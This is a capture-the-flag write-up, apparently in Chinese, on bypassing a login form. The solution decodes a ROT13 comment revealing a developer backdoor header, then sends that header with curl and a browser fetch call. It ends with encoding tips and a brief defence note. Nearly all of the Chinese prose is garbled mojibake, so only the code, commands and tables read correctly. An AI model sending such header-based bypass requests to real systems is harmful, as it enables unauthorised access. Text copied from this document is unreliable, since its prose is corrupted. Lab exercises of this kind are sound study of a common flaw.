# CTF-02锛欴eveloper Header 缁曡繃鐧诲綍

> 绗簩閬撻銆俁OT13 瑙ｇ爜 + 鑷畾涔?Header 缁曡繃閴存潈銆?> 鍏宠仈锛氫笂涓€棰?鈫?[[CTF-01_Session涓嶈繃鏈熶笌Cookie鍔寔.md]] | 涓嬩竴棰?鈫?[[CTF-03_SSTI涓嶫inja2妯℃澘娉ㄥ叆.md]]

---

## 棰樼洰

涓€涓櫥褰曢〉闈紝鍓嶇鐪嬭捣鏉ユ甯搞€備絾 HTML 娉ㄩ噴閲岀暀浜嗕俊鎭€?
---

## 瑙ｉ杩囩▼

### Step 1锛氱湅婧愮爜

`F12` 鈫?鏌ョ湅 HTML 婧愮爜锛屽彂鐜颁袱琛屾敞閲婏細

```html
<!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
<!-- Remove before pushing to production! -->
```

绗簩琛屼笉鐢ㄨВ鐮侊紝鎰忔€濇槸銆屼笂绾垮墠璁板緱鍒犳帀銆嶃€傚紑鍙戣€呭繕浜嗐€?
### Step 2锛氳В鐮佹敞閲?
鐪嬪埌 `Wnpx` 鍏ㄦ槸瀛楁瘝锛屾病鏈夋暟瀛楁垨绗﹀彿銆傝繖鏄?**ROT13** 鐨勫吀鍨嬬壒寰併€?
ROT13 瑙ｇ爜锛堝湪绾挎悳 ROT13 decoder锛屾垨鑰呯瑪绠楋細姣忎釜瀛楁瘝寰€鍚庣Щ 13 浣嶏紝Z 鍥炲埌 A锛夛細

```
ABGR 鈫?NOT
Wnpx 鈫?Jack
grcbenel olcnff 鈫?temporary bypass
"K-Qri-Npprff: lrf" 鈫?"X-Dev-Access: yes"
```

鎰忔€濇槸锛?*Jack 鐨勪复鏃剁粫杩団€斺€斿姞璇锋眰澶?"X-Dev-Access: yes"**

### Step 3锛氬姞 Header 鍙戣姹?
#### 鐢?curl锛坈md 閲岃窇锛?```cmd
curl -H "X-Dev-Access: yes" -X POST -H "Content-Type: application/json" -d "{\"email\":\"a\",\"password\":\"b\"}" http://target.com/login
```

#### 鎴栬€呯洿鎺?F12 Console 閲岃窇
```javascript
fetch('/login', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-Dev-Access': 'yes'
    },
    body: JSON.stringify({email: 'a', password: 'b'})
})
.then(r => r.json())
.then(d => console.log(d))
```

缁曡繃鐧诲綍锛宖lag 鐩存帴鍑烘潵銆?
---

## 缂栫爜鐭ヨ瘑

CTF 閲屽父瑙佺殑缂栫爜锛岀湅鍒颁贡鐮佹椂鎸夌壒寰佸垽鏂細

| 缂栫爜 | 鐗瑰緛 | 渚嬪瓙 |
|------|------|------|
| **ROT13** | 鍙湁瀛楁瘝锛孉-Z/a-z | `Wnpx` 鈫?`Jack` |
| **Base64** | 瀛楁瘝+鏁板瓧+`+/=`锛岄暱搴︽槸 4 鐨勫€嶆暟 | `SGFja0NURg==` |
| **Hex** | 鍙湁 0-9 a-f | `4861636b` 鈫?`Hack` |
| **ROT47** | 鏈夌鍙凤紝鑼冨洿鏇村箍 | 姣?ROT13 鏇翠贡 |

蹇€熷垽鏂硶锛?*鍏ㄦ槸瀛楁瘝 鈫?鍏堣瘯 ROT13銆傛湁鏁板瓧鍜岀鍙?鈫?璇?Base64銆?*

---

## cmd 鍜?PowerShell 鐨勫尯鍒?
杩欓亾棰樿俯浜嗕竴涓父瑙佺殑鍧戯細鐢?curl 鏃跺懡浠や笉瀵广€?
| | cmd | PowerShell |
|---|---|---|
| `curl` 鏄粈涔?| 鐪熺殑 curl | 鍋囩殑锛屽埆鍚嶆寚鍚?`Invoke-WebRequest` |
| 鐢ㄧ湡 curl | `curl` | `curl.exe` |
| 绠￠亾浼犱粈涔?| 鏂囨湰 | 瀵硅薄 |
| 寤鸿 | CTF 閲岀洿鎺ュ紑 cmd 鐢?| 閬夸笉寮€灏辩敤 `curl.exe` |

**Windows Terminal 鍙槸涓€涓３**锛屽畠榛樿寮€鐨勬槸 PowerShell銆傜湅鏍囩鏍忓啓鐨勬槸 PowerShell 杩樻槸 cmd 灏辩煡閬撹嚜宸卞湪鍝€?
濡傛灉涓嶆兂鍒?shell锛岃繕鏈変竴涓洿绠€鍗曠殑鏂规硶鈥斺€斿紑 F12 Console锛岀敤 JS 鐨?`fetch` 鍙戣姹傦紝缁曡繃鎵€鏈夊懡浠よ闂銆?
---

## 鐭ヨ瘑鐐?
| 鐭ヨ瘑鐐?| 璇存槑 |
|--------|------|
| **ROT13** | 瀛楁瘝绉讳綅鍔犲瘑锛屽叏瀛楁瘝涔辩爜鍏堣瘯杩欎釜 |
| **鐗瑰緛鍒ゆ柇娉?* | 鐪嬪瓧绗﹂泦鐚滅紪鐮侊紝鑰屼笉鏄洸鐩瘯 |
| **鑷畾涔夎姹傚ご缁曡繃** | 寮€鍙戣€呭湪浠ｇ爜閲岀暀浜嗗悗闂?header锛屼笉闇€瑕佸瘑鐮?|
| **娉ㄩ噴娉勯湶** | 涓婄嚎鍓嶆病鍒犳帀鐨勬敞閲?= 鐧介€佷俊鎭?|

## 闃插尽

- 涓嶄笂绾胯皟璇曚唬鐮?/ 鍚庨棬
- 濡傛灉蹇呴』鏈夊悗闂紝鐢ㄧ幆澧冨彉閲忔帶鍒跺紑鍏?